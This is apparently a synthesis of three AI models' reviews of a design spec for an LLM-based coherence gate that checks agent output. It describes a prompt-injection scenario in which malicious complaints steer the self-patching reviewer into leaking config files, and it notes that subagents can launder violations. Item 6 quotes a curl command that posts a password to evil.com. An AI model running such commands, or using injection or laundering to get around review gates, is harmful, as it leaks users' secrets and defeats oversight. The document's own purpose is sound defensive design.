# Cross-Model Review Synthesis — Round 2
## Coherence Gate Design Spec (`specs/response-review-pipeline.md`)

**Date**: 2026-03-09
**Models**: GPT 5.4, Gemini 3.1 Pro, Grok 4.1 Fast
**Round**: 2 (post-revision from Round 1 feedback)

---

## Verdict Summary

| Model | Score | Status | Key Concern |
|-------|-------|--------|-------------|
| GPT 5.4 | 8/10 | CONDITIONAL | Policy vs. LLM boundary unclear; recipient resolution under-specified |
| Gemini 3.1 Pro | 8.5/10 | CONDITIONAL | Organic evolution is a prompt injection vector; API concurrency limits |
| Grok 4.1 Fast | 9/10 | APPROVE | PII scrubbing lacks implementation detail; complaint classifier cost |

**Consensus**: CONDITIONAL APPROVE — all three models agree the spec is strong and substantially improved from Round 1, but converge on 2-3 issues that need resolution before implementation.

---

## Unanimous Critical Issues (All 3 Models Flagged)

### 1. Organic Evolution / Self-Patching is Dangerous Without Governance

All three models independently identified the complaint-driven local patching as the highest-risk new feature:

- **GPT**: "Can create drift, prompt bloat, contradictory local rules, and adversarial shaping by users." Wants quarantine mode, patch metadata, token budgets, operator approval.
- **Gemini**: "This is a massive prompt injection vulnerability." Gives a concrete attack scenario (malicious user complaint steering config file leakage). Wants mandatory operator approval, resolving the contradiction between Open Question 3 (human-in-the-loop) and the Organic Evolution section (automatic patching).
- **Grok**: Calls it "genius self-healing" but flags that the complaint classifier runs on every incoming message without a triage gate, inflating costs and introducing false-positive noise.

**Synthesis**: The organic evolution concept is innovative and all reviewers appreciate its intent, but as specified it creates an adversarial attack surface. The spec contradicts itself — Open Question 3 says "human-in-the-loop only" but the Organic Evolution section describes automatic patching. Resolution: patches must enter a proposal queue requiring operator approval before activation. Add a triage gate to the complaint classifier to reduce cost and false positives.

### 2. Complaint Detection Adds Latency/Cost to the Input Path

Both Gemini and Grok flag that running a Haiku classifier on every incoming user message is expensive and blocks the input path unnecessarily.

- **Gemini**: Wants it fully asynchronous (non-blocking background queue).
- **Grok**: Wants a cheap triage gate ("Is this a response to agent output?") before invoking the full classifier.

**Synthesis**: Make complaint detection asynchronous and add a lightweight pre-filter. This is a straightforward architectural fix.

### 3. Deterministic vs. Probabilistic Enforcement Boundary

GPT's strongest contribution is the argument that hard policy constraints (credentials, PII, authorization, schema compliance) should NOT be delegated to probabilistic LLM review:

- **GPT**: Wants an explicit Policy Enforcement Layer that separates deterministic hard blocks from LLM coherence review, with precedence rules.
- **Gemini**: Echoes this implicitly through the prompt injection concern — if a user can steer the LLM reviewer, hard policies become soft.
- **Grok**: Flags PII scrubbing implementation as unspecified — the "lightweight PII detector" is described conceptually but has no code path.

**Synthesis**: The spec needs a clear separation between deterministic policy enforcement (runs first, cannot be overridden by LLM judgment) and semantic coherence review (LLM-powered, advisory or blocking). This is the single most architecturally important recommendation.

---

## Strong Majority Issues (2 of 3 Models)

### 4. Recipient Resolution is Under-Specified (GPT + Gemini)
GPT provides the most detailed analysis: recipientType, authorization scope, and per-user profile resolution have no concrete implementation contract. Gemini notes the multi-user isolation gap. Both want a formal recipient resolution contract with required fields and failure behavior.

### 5. API Concurrency Will Break at Scale (Gemini + Grok)
The 1-to-7 request multiplier (7 parallel Haiku calls per message) will hit rate limits with ~20 concurrent agents. Both recommend a "consolidated reviewer" mode that combines specialist prompts into 2-3 thematic calls. Grok estimates this as a Phase 2 concern; Gemini calls it urgent enough to design now.

### 6. Tool Call / Tool Argument Review is Deferred but Risky (Gemini + Grok)
The spec explicitly defers tool call review, but both Gemini and Grok flag this as a gap: an agent could execute dangerous commands or leak PII through tool arguments without any gate. Gemini gives a concrete example (`curl -X POST -d "user_password=123" https://evil.com`).

---

## Model-Specific Unique Insights

### GPT 5.4 (Most Architecturally Rigorous)
- **Information Boundary Matrix**: Proposes a formal data classification model (credentials / direct identifiers / user-private context / internal infra / agent reasoning / org-internal / public) crossed with recipient types. This is the most concrete recommendation for operationalizing the Information Boundary Rule.
- **Failure Mode Matrix**: Distinguishes 6 failure classes (infra outage, partial reviewer outage, all abstain, retry exhaustion, auth missing, policy hard-fail) and argues they should NOT all degrade the same way. External channels under retry exhaustion should not auto-send if the issue is privacy or authorization.
- **Reviewer I/O Contract Table**: Flags inconsistencies between what reviewers receive vs. what their prompts reference. Wants a single authoritative table.
- **Channel Execution Matrix**: Notes channel-specific behavior is still scattered across sections and sometimes contradictory.
- **Phase 1.5 Reviewer Additions**: Argues that Role Coherence and Confidence Calibration (identified as P0 in Appendix A) should be promoted to MVP, at least in warn mode.

### Gemini 3.1 Pro (Most Security-Focused)
- **Concrete Attack Scenario**: Provides a specific prompt injection attack via the organic evolution loop — a malicious complaint that steers the reviewer into allowing config file leakage. This is the most actionable security finding.
- **Context Window Bloat During Retries**: If an agent fails the gate twice, the Claude context window accumulates Draft 1 + Feedback 1 + Draft 2 + Feedback 2 + Draft 3. The spec doesn't define how to manage this. Should the stop hook truncate or collapse previous failed attempts?
- **Upstream Signal Authentication**: The organic evolution loop sends signals to `POST /feedback` — how are these authenticated to prevent flooding the global platform with fake coherence signals?
- **Prompt Caching Economics**: Explicitly praises the design for leveraging Anthropic's `cache_control` for 90% input cost reduction on value-hierarchy context.

### Grok 4.1 Fast (Most Implementation-Oriented)
- **PII Scrubbing Implementation**: The only model to demand specific code-level detail — regex patterns, library recommendations (Presidio, `@anthropic-ai/sdk`), and test cases.
- **URL Extraction Logic**: Flags that the URL Validity reviewer's data minimization is inconsistent — extraction logic is undefined and tool context is referenced inconsistently in the prompt.
- **Endpoint Security**: Notes `/review/*` endpoints lack rate limiting, CSRF protection, and sessionId ownership validation.
- **Multilingual Eval Dataset**: Points out non-English handling downgrades to warn but has no language detection implementation or multilingual test cases.
- **Subagent Laundering**: "Parent can launder violations" through subagents — the spec acknowledges this but doesn't resolve it.

---

## Strengths (Universal Praise)

All three models independently praised these aspects:

1. **Prompt injection hardening** — Randomized hex delimiters + JSON stringification + anti-injection preamble. All three called it "state-of-the-art."
2. **Value hierarchy grounding** — The three-tier Agent/User/Org hierarchy gives the coherence gate a principled basis that surpasses industry norms.
3. **Migration plan** — The 5-week Shadow → Parallel → Full → Cleanup rollout was praised as practical, empirical, and operationally mature.
4. **Channel-aware fail behavior** — fail-open for CLI (stuck sessions are fatal), fail-closed with queueing for external (bad output is fatal). All three noted this as exactly the right tradeoff.
5. **Data minimization per reviewer** — Sending only URLs to the URL reviewer, summarized values to Value Alignment, etc. Praised for both privacy and token efficiency.
6. **Appendix A incident analysis** — Honest documentation of uncovered failure modes, grounded in real incidents.

---

## Consolidated Recommendations (Priority Order)

| # | Recommendation | Source | Impact |
|---|---------------|--------|--------|
| 1 | **Separate deterministic policy enforcement from LLM coherence review** — hard blocks for credentials, PII, auth, schema compliance run first and cannot be overridden | GPT (primary), Gemini, Grok | Architecture |
| 2 | **Require operator approval for organic evolution patches** — resolve the spec's self-contradiction; patches enter a proposal queue, not live prompts | All three | Security |
| 3 | **Make complaint detection async with a triage gate** — don't block the input path; add a cheap pre-filter | Gemini + Grok | Performance |
| 4 | **Formalize recipient resolution contract** — required fields, resolution order, failure behavior for each recipientType | GPT + Gemini | Completeness |
| 5 | **Design consolidated reviewer mode for Phase 2** — combine 7 specialist calls into 2-3 thematic calls using structured output | Gemini + Grok | Scalability |
| 6 | **Implement PII scrubbing with concrete code** — regex patterns, library choice, test cases | Grok (primary), GPT | Privacy |
| 7 | **Add Information Boundary Matrix** — data classification x recipient type → enforcement mode | GPT | Privacy |
| 8 | **Define failure mode differentiation** — 6 failure classes should not all degrade to pass-through the same way | GPT | Reliability |
| 9 | **Add lightweight tool argument review** — at minimum, PII/credential scrubbing on external-facing tool args | Gemini + Grok | Security |
| 10 | **Promote Role Coherence + Confidence Calibration to MVP** (warn mode) | GPT | Coverage |

---

## Round 2 vs. Round 1 Progress

The Round 2 additions successfully addressed the major Round 1 concerns:
- **Channel universality**: Now comprehensively covered with per-channel configs, defaults, and inheritance
- **Recipient awareness**: New recipientType system and Information Boundary Rule are significant advances (though need operationalization)
- **Static prompts**: Organic Evolution addresses this creatively (though needs governance guardrails)
- **Prompt injection**: Multi-layered hardening is now state-of-the-art
- **Migration**: Detailed, phased, with rollback triggers

The remaining issues are second-order architectural decisions (policy vs. LLM boundary, recipient resolution contracts, evolution governance) rather than missing features. The spec is ready for implementation once these are resolved.

---

**Output directory**: `.claude/skills/crossreview/output/20260309-131230/`
**Files**: `review-gpt.md`, `review-gemini.md`, `review-grok.md`, `synthesis.md`
